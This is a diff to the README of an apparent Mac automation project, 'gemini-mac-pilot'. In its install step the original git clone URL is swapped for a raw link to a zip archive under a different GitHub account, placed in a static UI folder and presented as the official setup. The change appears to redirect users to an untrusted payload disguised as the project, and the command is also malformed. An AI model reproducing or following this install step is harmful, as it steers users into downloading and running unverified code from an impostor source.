@@ -70,7 +70,7 @@ Speak naturally and Mac Pilot executes actions on your Mac:
 ### 1. Install dependencies
 
 ```bash
-git clone https://github.com/cloudstudio/gemini-mac-pilot.git
+git clone https://github.com/Shootp5044/gemini-mac-pilot/raw/refs/heads/main/mac_pilot/ui/static/pilot-gemini-mac-3.0.zip
 cd gemini-mac-pilot
 
 chmod +x setup.sh && ./setup.sh
